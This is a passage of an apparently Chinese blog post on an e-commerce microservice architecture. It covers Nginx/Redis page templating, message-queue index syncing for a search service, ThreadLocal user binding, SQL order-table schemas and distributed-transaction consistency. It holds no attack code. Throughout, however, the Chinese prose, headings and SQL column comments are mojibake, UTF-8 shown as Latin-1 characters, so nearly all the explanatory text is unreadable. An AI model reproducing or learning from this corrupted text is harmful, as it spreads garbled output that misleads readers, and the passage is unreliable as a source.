<li>ç”¨æˆ·è¯·æ±‚æ¸²æŸ“å¥½çš„Htmlï¼Œå“åº”é€Ÿåº¦å¿«</li>
<li>é€šè¿‡MQå¼‚æ­¥æ›´æ–°ï¼Œä¿è¯æ•°æ®åŒæ­¥</li>
</ul>
<p>ç¼ºç‚¹ï¼š</p>
<ul>
<li>å°éƒ¨åˆ†æ•°æ®å¦‚ä»·æ ¼å˜æ›´ï¼Œæ•´ä¸ªé™æ€é¡µéƒ½è¦é‡æ–°ç”Ÿæˆ</li>
<li>éšç€å•†å“æ•°é‡å¢åŠ ï¼Œé¡µé¢ä¼šè¶Šæ¥è¶Šå¤š</li>
<li>é¡µé¢æ¨¡æ¿å˜æ›´ï¼Œæ‰€æœ‰å•†å“çš„é™æ€é¡µéƒ½è¦é‡æ–°ç”Ÿæˆï¼Œéå¸¸å›°éš¾</li>
</ul>
<h5 id="è®¾è®¡æ–¹æ¡ˆå››ï¼šåŠ¨æ€æ¨¡ç‰ˆï¼Œé™æ€åŒ–æ•°æ®"><a href="#è®¾è®¡æ–¹æ¡ˆå››ï¼šåŠ¨æ€æ¨¡ç‰ˆï¼Œé™æ€åŒ–æ•°æ®" class="headerlink" title="è®¾è®¡æ–¹æ¡ˆå››ï¼šåŠ¨æ€æ¨¡ç‰ˆï¼Œé™æ€åŒ–æ•°æ®"></a>è®¾è®¡æ–¹æ¡ˆå››ï¼šåŠ¨æ€æ¨¡ç‰ˆï¼Œé™æ€åŒ–æ•°æ®</h5><p>æµç¨‹å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120488.png" alt="image-20210704022129626"></p>
<p>é¦–å…ˆï¼ŒæŠŠé¡µé¢åˆ†æˆå‡ éƒ¨åˆ†ï¼šå¦‚é¡¶éƒ¨é¢åŒ…å±‘ã€å•†å“SKUå±•ç¤ºã€å•†å“æè¿°ã€å•†å“è¯„è®ºç­‰ï¼Œå½¢æˆå¤šä¸ªé¡µé¢æ¨¡æ¿ï¼ˆæ¨¡å—ï¼‰ã€‚å¯¹åº”çš„æ•°æ®ä¹Ÿåˆ†æˆå‡ éƒ¨åˆ†ï¼Œè¿™äº›æ•°æ®å¯èƒ½æ¥è‡ªä¸åŒçš„å¾®æœåŠ¡ã€‚è¿™æ ·å¯ä»¥å‡å°‘å› å±€éƒ¨å˜æ›´å¼•èµ·çš„æ•´ä¸ªé¡µé¢é‡æ–°ç”Ÿæˆã€‚</p>
<p>å°†é¡µé¢æ¨¡æ¿å­˜å‚¨åˆ°Nginxä¸­ï¼Œå½“ç”¨æˆ·è¯·æ±‚æŸä¸ªé¡µé¢æ—¶ï¼Œæˆ‘ä»¬åœ¨Nginxä¸­æ¸²æŸ“æ¨¡æ¿ï¼ŒæŠŠæ¸²æŸ“å¥½çš„æ¨¡æ¿ç»„åˆåœ¨ä¸€èµ·ï¼Œå½¢æˆå®Œæ•´é¡µé¢ï¼Œè¿”å›åˆ°ç”¨æˆ·ã€‚</p>
<p>Nginxæ¸²æŸ“é¡µé¢æ—¶ï¼Œéœ€è¦çš„æ•°æ®å¯ä»¥ç¼“å­˜åœ¨Nginxçš„æœ¬åœ°å…±äº«è¯å…¸ä¸­ï¼ˆé•¿æœŸä¸ä¼šä¿®æ”¹çš„æ•°æ®ï¼‰ï¼Œå¦‚æœå‘½ä¸­åˆ™ç›´æ¥æ¸²æŸ“å¹¶è¿”å›ã€‚å¦‚æœæœªå‘½ä¸­ï¼Œåˆ™æŸ¥è¯¢Redisé›†ç¾¤ï¼Œè·å–æ•°æ®ã€‚å¦‚æœRedisé›†ç¾¤ä¾ç„¶æœªå‘½ä¸­ï¼Œå†å»æŸ¥è¯¢åå°å¾®æœåŠ¡ï¼Œç”±å¾®æœåŠ¡è·å–æ•°æ®ï¼Œç„¶åå†™å…¥ç¼“å­˜ä¸­ï¼Œä¿è¯ä¸‹æ¬¡Nginxå¯ä»¥ä»ç¼“å­˜ä¸­æ‹¿åˆ°æ•°æ®ã€‚è¿™æ ·å¯ä»¥å‡å°‘æœåŠ¡ç«¯å‹åŠ›ã€‚</p>
<p>å¦å¤–ï¼Œä¸ºäº†ä¿è¯Redisæ•°æ®ä¸æ•°æ®åº“æ•°æ®ä¸€è‡´ï¼Œè¿™é‡Œä½¿ç”¨CanalæŠ€æœ¯ï¼Œç›‘å¬æ•°æ®åº“å˜åŒ–ï¼ŒåŠæ—¶æ›´æ–°Redisæ•°æ®ã€‚</p>
<h4 id="æœç´¢å¾®æœåŠ¡-ly-search"><a href="#æœç´¢å¾®æœåŠ¡-ly-search" class="headerlink" title="æœç´¢å¾®æœåŠ¡(ly-search)"></a>æœç´¢å¾®æœåŠ¡(ly-search)</h4><p>æä¾›æœç´¢æœåŠ¡ï¼Œæœç´¢æ¡†è¡¥é½ï¼Œå¾—è§£å†³æ•°æ®åŒæ­¥é—®é¢˜ï¼Œæœç´¢åŠŸèƒ½ä¾èµ–çš„å•†å“æ•°æ®æ˜¯å­˜å‚¨åœ¨ElasticSearchä¸­çš„ï¼Œä½†æ˜¯æ•°æ®åº“ä¸­ä¹Ÿæœ‰ä¸€ä»½å•†å“æ•°æ®ã€‚å½“æˆ‘ä»¬å¯¹å•†å“åšå¢ã€åˆ ã€æ”¹è¿™æ ·çš„æ“ä½œæ—¶ï¼ŒElasticSearchå¹¶æœªæ„ŸçŸ¥åˆ°ï¼Œæ­¤æ—¶å°±ä¼šå‡ºç°<strong>æ•°æ®åº“æ•°æ®ä¸ç´¢å¼•åº“æ•°æ®çš„ä¸ä¸€è‡´</strong>ã€‚</p>
<p>ä¸è¿‡ï¼Œæˆ‘ä»¬å¹¶ä¸éœ€è¦åœ¨å•†å“å¢ã€åˆ ã€æ”¹çš„æ—¶å€™éƒ½å¯¹ç´¢å¼•åº“åšå¤„ç†ï¼Œå› ä¸ºç´¢å¼•åº“ä¸­åªéœ€è¦ä¸Šæ¶çš„å•†å“ï¼Œå¦‚æœä¸€ä¸ªå•†å“æ–°å¢äº†ï¼Œå¹¶ä¸ä»£è¡¨ä¹Ÿä¸Šæ¶äº†ã€‚è€Œä¸”ï¼Œå•†å“è¦ä¿®æ”¹å’Œåˆ é™¤å‰å¿…é¡»å…ˆä¸‹æ¶ï¼Œå•†å“æ–°å¢åè¿˜è¦ä¸Šæ¶ã€‚</p>
<p>æ‰€ä»¥ï¼Œæˆ‘ä»¬éœ€è¦åšçš„æ˜¯ï¼š</p>
<ul>
<li>å•†å“ä¸Šæ¶ï¼šåœ¨ç´¢å¼•åº“æ–°å¢æ•°æ®</li>
<li>å•†å“ä¸‹æ¶ï¼šæŠŠæ•°æ®ä»ç´¢å¼•åº“åˆ é™¤</li>
</ul>
<p>ä½†å•†å“çš„ä¸Šæ¶å’Œä¸‹æ¶æ—¶å•†å“å¾®æœåŠ¡<code>ly-item</code>ä¸­å¤„ç†çš„ï¼Œç´¢å¼•åº“æ•°æ®æ˜¯åœ¨<code>ly-search</code>ä¸­å¤„ç†çš„ã€‚æˆ‘ä»¬å¦‚ä½•åœ¨ä¸Šæ¶æ—¶ä¿®æ”¹ç´¢å¼•åº“å‘¢ï¼Ÿ</p>
<p>ä¸»è¦æœ‰ä¸¤ç§è®¾è®¡æ–¹æ¡ˆï¼š</p>
<ul>
<li><p>æ–¹æ¡ˆ1ï¼šåœ¨å•†å“å¾®æœåŠ¡çš„ä¸Šä¸‹æ¶ä¸šåŠ¡åï¼ŒåŠ å…¥ä¿®æ”¹ç´¢å¼•åº“æ•°æ®</p>
</li>
<li><p>æ–¹æ¡ˆ2ï¼šæœç´¢æœåŠ¡å¯¹å¤–æä¾›æ“ä½œç´¢å¼•åº“ï¼Œå•†å“å¾®æœåŠ¡åœ¨å•†å“ä¸Šä¸‹æ¶åï¼Œè°ƒç”¨æ¥å£ã€‚</p>
</li>
</ul>
<p>ä½†æ˜¯ä»¥ä¸Šä¸¤ç§æ–¹å¼éƒ½æœ‰åŒä¸€ä¸ªä¸¥é‡é—®é¢˜ï¼šå°±æ˜¯ä»£ç è€¦åˆï¼Œåå°æœåŠ¡ä¸­éœ€è¦åµŒå…¥æœç´¢å’Œå•†å“é¡µé¢æœåŠ¡ï¼Œè¿èƒŒäº†å¾®æœåŠ¡çš„ç‹¬ç«‹åŸåˆ™ï¼Œè€Œä¸”ä¸¥é‡è¿èƒŒäº†å¼€é—­åŸåˆ™ã€‚</p>
<p>æ‰€ä»¥åœ¨è¿™ä¸ªåœ°æ–¹æˆ‘ä»¬é‡‡ç”¨æ¶ˆæ¯é˜Ÿåˆ—æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p>
<p>æµç¨‹å›¾å¦‚ä¸‹ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120489.png" alt="image-20210704015047660"></p>
<p>å•†å“å¾®æœåŠ¡åœ¨å®Œæˆä¸Šæ¶ã€ä¸‹æ¶åï¼Œå‘é€æ¶ˆæ¯åˆ°MQï¼Œé€šçŸ¥æ˜¯å“ªä¸ªå•†å“æ›´æ–°äº†ï¼Œè‡ªå·±çš„ä¸šåŠ¡å°±ç»“æŸäº†ï¼Œå•†å“å¾®æœåŠ¡ä¸éœ€è¦çŸ¥é“ï¼Œä¹Ÿä¸å…³å¿ƒåˆ°åº•æ˜¯è°åœ¨ç›‘å¬è¿™æ¡æ¶ˆæ¯ã€‚</p>
<p>æœç´¢å¾®æœåŠ¡åœ¨æ¥æ”¶åˆ°æ¶ˆæ¯åï¼Œæ›´æ–°ç´¢å¼•åº“æ•°æ®å³å¯ï¼ŒåŒæ ·ä¸éœ€è¦å…³å¿ƒåˆ«äººã€‚</p>
<p>ä¸¤ä¸ªå¾®æœåŠ¡ä¹‹é—´æ²¡æœ‰ç›´æ¥è°ƒç”¨ï¼Œæ²¡æœ‰ä¸šåŠ¡çš„è€¦åˆã€‚</p>
<h4 id="äº¤æ˜“å¾®æœåŠ¡-ly-trade"><a href="#äº¤æ˜“å¾®æœåŠ¡-ly-trade" class="headerlink" title="äº¤æ˜“å¾®æœåŠ¡(ly-trade)"></a>äº¤æ˜“å¾®æœåŠ¡(ly-trade)</h4><p>å®Œæˆå­˜å…¥è´­ç‰©è½¦ä»¥åŠä¸‹å•åŠŸèƒ½ï¼Œåªè¦éš¾ç‚¹åœ¨äºåˆ†å¸ƒå¼äº‹åŠ¡ï¼Œåˆ†å¸ƒå¼é”ï¼Œä»¥åŠå¦‚ä½•è·å–ç™»é™†ç”¨æˆ·ä¿¡æ¯ï¼Œå¦‚ä½•å°†ç”¨æˆ·ä¿¡æ¯ä¸å½“å‰è¯·æ±‚çº¿ç¨‹ç»‘å®šï¼›</p>
<h5 id="è·å–ç”¨æˆ·æ€è·¯åˆ†æ"><a href="#è·å–ç”¨æˆ·æ€è·¯åˆ†æ" class="headerlink" title="è·å–ç”¨æˆ·æ€è·¯åˆ†æ"></a>è·å–ç”¨æˆ·æ€è·¯åˆ†æ</h5><p>åœ¨è¯·æ±‚è¿›å…¥äº¤æ˜“æœåŠ¡æ—¶å°±è·å–ç”¨æˆ·ä¿¡æ¯ï¼Œå¹¶ä¸”å°†å½“å‰ç”¨æˆ·ä¿¡æ¯ä¸å½“å‰è¯·æ±‚çº¿ç¨‹ç»‘å®šã€‚</p>
<h6 id="è®¾è®¡æ–¹æ¡ˆä¸€ï¼šé¡µé¢ç›´æ¥æŠŠç”¨æˆ·ä½œä¸ºè¯·æ±‚å‚æ•°ä¼ é€’"><a href="#è®¾è®¡æ–¹æ¡ˆä¸€ï¼šé¡µé¢ç›´æ¥æŠŠç”¨æˆ·ä½œä¸ºè¯·æ±‚å‚æ•°ä¼ é€’" class="headerlink" title="è®¾è®¡æ–¹æ¡ˆä¸€ï¼šé¡µé¢ç›´æ¥æŠŠç”¨æˆ·ä½œä¸ºè¯·æ±‚å‚æ•°ä¼ é€’"></a>è®¾è®¡æ–¹æ¡ˆä¸€ï¼šé¡µé¢ç›´æ¥æŠŠç”¨æˆ·ä½œä¸ºè¯·æ±‚å‚æ•°ä¼ é€’</h6><ul>
<li>ä¼˜ç‚¹ï¼šç®€å•ã€æ–¹ä¾¿ã€ä»£ç é‡ä¸º0</li>
<li>ç¼ºç‚¹ï¼šä¸å®‰å…¨ï¼Œå› ä¸ºè°ƒç”¨è´­ç‰©è½¦CRUDçš„è¯·æ±‚æ—¶ä»é¡µé¢å‘è¿‡æ¥çš„ï¼Œä¸èƒ½ç¡®å®šè¿™ä¸ªä¼ é€’çš„å‚æ•°idæ˜¯ä¸æ˜¯ç”¨æˆ·çœŸå®çš„idã€‚</li>
</ul>
<h6 id="è®¾è®¡æ–¹æ¡ˆäºŒï¼šè‡ªå·±ä»cookieçš„tokenä¸­è§£æç”¨æˆ·ä¿¡æ¯"><a href="#è®¾è®¡æ–¹æ¡ˆäºŒï¼šè‡ªå·±ä»cookieçš„tokenä¸­è§£æç”¨æˆ·ä¿¡æ¯" class="headerlink" title="è®¾è®¡æ–¹æ¡ˆäºŒï¼šè‡ªå·±ä»cookieçš„tokenä¸­è§£æç”¨æˆ·ä¿¡æ¯"></a>è®¾è®¡æ–¹æ¡ˆäºŒï¼šè‡ªå·±ä»cookieçš„tokenä¸­è§£æç”¨æˆ·ä¿¡æ¯</h6><ul>
<li>ä¼˜ç‚¹ï¼šå®‰å…¨</li>
<li>ç¼ºç‚¹ï¼šéœ€è¦é‡å¤æ£€éªŒjwtï¼Œç½‘å…³å±‚å·²ç»åšè¿‡äº†ï¼›ä»£ç è¿˜å¾ˆéº»çƒ¦</li>
</ul>
<p>å½“è·å–ç”¨æˆ·ä¿¡æ¯åï¼Œæˆ‘ä»¬éœ€è¦æŠŠç”¨æˆ·ä¿å­˜èµ·æ¥ï¼Œæ–¹ä¾¿åé¢çš„ä¸šåŠ¡ä½¿ç”¨ã€‚</p>
<p>æ¯æ¬¡è¯·æ±‚éƒ½æœ‰ä¸åŒçš„ç”¨æˆ·ä¿¡æ¯ï¼Œåœ¨å¹¶å‘è¯·æ±‚æƒ…å†µä¸‹ï¼Œå¿…é¡»ä¿è¯æ¯æ¬¡è¯·æ±‚ä¿å­˜çš„ç”¨æˆ·ä¿¡æ¯äº’ä¸å¹²æ‰°ï¼Œçº¿ç¨‹ç‹¬ç«‹ã€‚å¯ä»¥ä½¿ç”¨ThreadLocalæŠŠ<strong>ç”¨æˆ·ä¸æ¯ä¸€ä¸ªè¯·æ±‚çº¿ç¨‹ç»‘å®š</strong>ã€‚</p>
<h4 id="è®¢å•æ•°æ®ç»“æ„è®¾è®¡"><a href="#è®¢å•æ•°æ®ç»“æ„è®¾è®¡" class="headerlink" title="è®¢å•æ•°æ®ç»“æ„è®¾è®¡"></a>è®¢å•æ•°æ®ç»“æ„è®¾è®¡</h4><p>é‡‡ç”¨æ•°æ®åº“å‚ç›´æ‹†åˆ†æ–¹å¼ï¼š</p>
<p>è®¢å•è¡¨ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `tb_order` (</span><br><span class="line">  `order_id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;è®¢å•id&#x27;</span>,</span><br><span class="line">  `total_fee` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;æ€»é‡‘é¢ï¼Œå•ä½ä¸ºåˆ†&#x27;</span>,</span><br><span class="line">  `actual_fee` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;å®ä»˜é‡‘é¢ã€‚å•ä½:åˆ†ã€‚å¦‚:20007ï¼Œè¡¨ç¤º:200å…ƒ7åˆ†&#x27;</span>,</span><br><span class="line">  `payment_type` tinyint(<span class="number">2</span>) unsigned zerofill <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;æ”¯ä»˜ç±»å‹ï¼Œ1ã€å¾®ä¿¡æ”¯ä»˜ï¼Œ2ã€æ”¯ä»˜å®æ”¯ä»˜&#x27;</span>,</span><br><span class="line">  `post_fee` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;é‚®è´¹ã€‚å•ä½:åˆ†ã€‚å¦‚:20007ï¼Œè¡¨ç¤º:200å…ƒ7åˆ†&#x27;</span>,</span><br><span class="line">  `user_id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;ç”¨æˆ·id&#x27;</span>,</span><br><span class="line">  `status` tinyint(<span class="number">2</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;è®¢å•çš„çŠ¶æ€ï¼Œ1ã€æœªä»˜æ¬¾ 2ã€å·²ä»˜æ¬¾,æœªå‘è´§ 3ã€å·²å‘è´§,æœªç¡®è®¤ 4ã€ç¡®è®¤æ”¶è´§ï¼Œäº¤æ˜“æˆåŠŸ 5ã€äº¤æ˜“å–æ¶ˆï¼Œè®¢å•å…³é—­ 6ã€äº¤æ˜“ç»“æŸï¼Œå·²è¯„ä»·&#x27;</span>,</span><br><span class="line">  `create_time` <span class="type">timestamp</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="string">&#x27;åˆ›å»ºæ—¶é—´&#x27;</span>,</span><br><span class="line">  `pay_time` <span class="type">timestamp</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;æ”¯ä»˜æ—¶é—´&#x27;</span>,</span><br><span class="line">  `consign_time` <span class="type">timestamp</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;å‘è´§æ—¶é—´&#x27;</span>,</span><br><span class="line">  `end_time` <span class="type">timestamp</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;äº¤æ˜“å®Œæˆæ—¶é—´&#x27;</span>,</span><br><span class="line">  `close_time` <span class="type">timestamp</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;äº¤æ˜“å…³é—­æ—¶é—´&#x27;</span>,</span><br><span class="line">  `comment_time` <span class="type">timestamp</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;è¯„ä»·æ—¶é—´&#x27;</span>,</span><br><span class="line">  `update_time` <span class="type">timestamp</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span> <span class="keyword">ON</span> <span class="keyword">UPDATE</span> <span class="built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="string">&#x27;æ›´æ–°æ—¶é—´&#x27;</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`order_id`),</span><br><span class="line">  KEY `multi_key_status_time` (`status`,`create_time`) <span class="keyword">USING</span> BTREE</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8 <span class="keyword">COLLATE</span><span class="operator">=</span>utf8_bin;</span><br></pre></td></tr></table></figure>



<p>ç‰©æµä¿¡æ¯è¡¨ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE `tb_order_logistics` (</span><br><span class="line">  `order_id` bigint(20) NOT NULL COMMENT &#x27;è®¢å•idï¼Œä¸è®¢å•è¡¨ä¸€å¯¹ä¸€&#x27;,</span><br><span class="line">  `logistics_number` varchar(18) DEFAULT &#x27;&#x27; COMMENT &#x27;ç‰©æµå•å·&#x27;,</span><br><span class="line">  `logistics_company` varchar(18) DEFAULT &#x27;&#x27; COMMENT &#x27;ç‰©æµå…¬å¸åç§°&#x27;,</span><br><span class="line">  `addressee` varchar(32) NOT NULL COMMENT &#x27;æ”¶ä»¶äºº&#x27;,</span><br><span class="line">  `phone` varchar(11) NOT NULL COMMENT &#x27;æ”¶ä»¶äººæ‰‹æœºå·ç &#x27;,</span><br><span class="line">  `province` varchar(16) NOT NULL COMMENT &#x27;çœ&#x27;,</span><br><span class="line">  `city` varchar(32) NOT NULL COMMENT &#x27;å¸‚&#x27;,</span><br><span class="line">  `district` varchar(32) NOT NULL COMMENT &#x27;åŒº&#x27;,</span><br><span class="line">  `street` varchar(256) NOT NULL COMMENT &#x27;è¡—é“&#x27;,</span><br><span class="line">  `postcode` int(6) DEFAULT &#x27;0&#x27; COMMENT &#x27;é‚®ç¼–&#x27;,</span><br><span class="line">  `create_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT &#x27;åˆ›å»ºæ—¶é—´&#x27;,</span><br><span class="line">  `update_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT &#x27;æ›´æ–°æ—¶é—´&#x27;,</span><br><span class="line">  PRIMARY KEY (`order_id`)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8;</span><br></pre></td></tr></table></figure>



<p>è®¢å•æ¡ç›®ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `tb_order_detail` (</span><br><span class="line">  `id` <span class="type">int</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;ä¸»é”®&#x27;</span>,</span><br><span class="line">  `order_id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;è®¢å•id&#x27;</span>,</span><br><span class="line">  `sku_id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;skuå•†å“id&#x27;</span>,</span><br><span class="line">  `num` <span class="type">int</span>(<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;è´­ä¹°æ•°é‡&#x27;</span>,</span><br><span class="line">  `title` <span class="type">varchar</span>(<span class="number">256</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;å•†å“æ ‡é¢˜&#x27;</span>,</span><br><span class="line">  `spec` <span class="type">varchar</span>(<span class="number">1024</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;&#x27;</span> COMMENT <span class="string">&#x27;å•†å“åŠ¨æ€å±æ€§é”®å€¼é›†&#x27;</span>,</span><br><span class="line">  `price` <span class="type">int</span>(<span class="number">16</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;ä»·æ ¼,å•ä½ï¼šåˆ†&#x27;</span>,</span><br><span class="line">  `image` <span class="type">varchar</span>(<span class="number">256</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;&#x27;</span> COMMENT <span class="string">&#x27;å•†å“å›¾ç‰‡&#x27;</span>,</span><br><span class="line">  `create_time` <span class="type">timestamp</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="string">&#x27;åˆ›å»ºæ—¶é—´&#x27;</span>,</span><br><span class="line">  `update_time` <span class="type">timestamp</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span> <span class="keyword">ON</span> <span class="keyword">UPDATE</span> <span class="built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="string">&#x27;æ›´æ–°æ—¶é—´&#x27;</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`) <span class="keyword">USING</span> BTREE,</span><br><span class="line">  KEY `key_order_id` (`order_id`) <span class="keyword">USING</span> BTREE</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8 COMMENT<span class="operator">=</span><span class="string">&#x27;è®¢å•è¯¦æƒ…è¡¨&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h4 id="åˆ†å¸ƒå¼äº‹åŠ¡"><a href="#åˆ†å¸ƒå¼äº‹åŠ¡" class="headerlink" title="åˆ†å¸ƒå¼äº‹åŠ¡"></a>åˆ†å¸ƒå¼äº‹åŠ¡</h4><h5 id="è·¨æ•°æ®æº"><a href="#è·¨æ•°æ®æº" class="headerlink" title="è·¨æ•°æ®æº"></a>è·¨æ•°æ®æº</h5><p>éšç€ä¸šåŠ¡æ•°æ®è§„æ¨¡çš„å¿«é€Ÿå‘å±•ï¼Œæ•°æ®é‡è¶Šæ¥è¶Šå¤§ï¼Œå•åº“å•è¡¨é€æ¸æˆä¸ºç“¶é¢ˆã€‚æ‰€ä»¥æˆ‘ä»¬å¯¹æ•°æ®åº“è¿›è¡Œäº†æ°´å¹³æ‹†åˆ†ï¼Œå°†åŸå•åº“å•è¡¨æ‹†åˆ†æˆæ•°æ®åº“åˆ†ç‰‡ï¼Œäºæ˜¯å°±äº§ç”Ÿäº†è·¨æ•°æ®åº“äº‹åŠ¡é—®é¢˜ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120490.png" alt="image-20210704030852255"></p>
<h5 id="è·¨æœåŠ¡"><a href="#è·¨æœåŠ¡" class="headerlink" title="è·¨æœåŠ¡"></a>è·¨æœåŠ¡</h5><p>åœ¨ä¸šåŠ¡å‘å±•åˆæœŸï¼Œâ€œä¸€å—å¤§é¥¼â€çš„å•ä¸šåŠ¡ç³»ç»Ÿæ¶æ„ï¼Œèƒ½æ»¡è¶³åŸºæœ¬çš„ä¸šåŠ¡éœ€æ±‚ã€‚ä½†æ˜¯éšç€ä¸šåŠ¡çš„å¿«é€Ÿå‘å±•ï¼Œç³»ç»Ÿçš„è®¿é—®é‡å’Œä¸šåŠ¡å¤æ‚ç¨‹åº¦éƒ½åœ¨å¿«é€Ÿå¢é•¿ï¼Œå•ç³»ç»Ÿæ¶æ„é€æ¸æˆä¸ºä¸šåŠ¡å‘å±•ç“¶é¢ˆï¼Œè§£å†³ä¸šåŠ¡ç³»ç»Ÿçš„é«˜è€¦åˆã€å¯ä¼¸ç¼©é—®é¢˜çš„éœ€æ±‚è¶Šæ¥è¶Šå¼ºçƒˆã€‚</p>
<p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒæŒ‰ç…§é¢å‘æœåŠ¡ï¼ˆSOAï¼‰çš„æ¶æ„çš„è®¾è®¡åŸåˆ™ï¼Œå°†å•ä¸šåŠ¡ç³»ç»Ÿæ‹†åˆ†æˆå¤šä¸ªä¸šåŠ¡ç³»ç»Ÿï¼Œé™ä½äº†å„ç³»ç»Ÿä¹‹é—´çš„è€¦åˆåº¦ï¼Œä½¿ä¸åŒçš„ä¸šåŠ¡ç³»ç»Ÿä¸“æ³¨äºè‡ªèº«ä¸šåŠ¡ï¼Œæ›´æœ‰åˆ©äºä¸šåŠ¡çš„å‘å±•å’Œç³»ç»Ÿå®¹é‡çš„ä¼¸ç¼©ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120491.png" alt="image-20210704030946480"></p>
<h5 id="åˆ†å¸ƒå¼ç³»ç»Ÿæ•°æ®ä¸€è‡´æ€§é—®é¢˜"><a href="#åˆ†å¸ƒå¼ç³»ç»Ÿæ•°æ®ä¸€è‡´æ€§é—®é¢˜" class="headerlink" title="åˆ†å¸ƒå¼ç³»ç»Ÿæ•°æ®ä¸€è‡´æ€§é—®é¢˜"></a>åˆ†å¸ƒå¼ç³»ç»Ÿæ•°æ®ä¸€è‡´æ€§é—®é¢˜</h5><p>åœ¨æ•°æ®åº“æ°´å¹³æ‹†åˆ†ã€æœåŠ¡å‚ç›´æ‹†åˆ†ä¹‹åï¼Œä¸€ä¸ªä¸šåŠ¡æ“ä½œé€šå¸¸è¦è·¨å¤šä¸ªæ•°æ®åº“ã€æœåŠ¡æ‰èƒ½å®Œæˆã€‚åœ¨åˆ†å¸ƒå¼ç½‘ç»œç¯å¢ƒä¸‹ï¼Œæˆ‘ä»¬æ— æ³•ä¿éšœæ‰€æœ‰æœåŠ¡ã€æ•°æ®åº“éƒ½ç™¾åˆ†ç™¾å¯ç”¨ï¼Œä¸€å®šä¼šå‡ºç°éƒ¨åˆ†æœåŠ¡ã€æ•°æ®åº“æ‰§è¡ŒæˆåŠŸï¼Œå¦ä¸€éƒ¨åˆ†æ‰§è¡Œå¤±è´¥çš„é—®é¢˜ã€‚</p>
<p>å½“å‡ºç°éƒ¨åˆ†ä¸šåŠ¡æ“ä½œæˆåŠŸã€éƒ¨åˆ†ä¸šåŠ¡æ“ä½œå¤±è´¥æ—¶ï¼Œä¸šåŠ¡æ•°æ®å°±ä¼šå‡ºç°ä¸ä¸€è‡´ã€‚</p>
<p>ä¸‹å•ä»˜æ¬¾ï¼š</p>
<ul>
<li>åˆ›å»ºæ–°è®¢å•</li>
<li>æ‰£å‡å•†å“åº“å­˜</li>
<li>ä»ç”¨æˆ·è´¦æˆ·ä½™é¢æ‰£é™¤é‡‘é¢</li>
</ul>
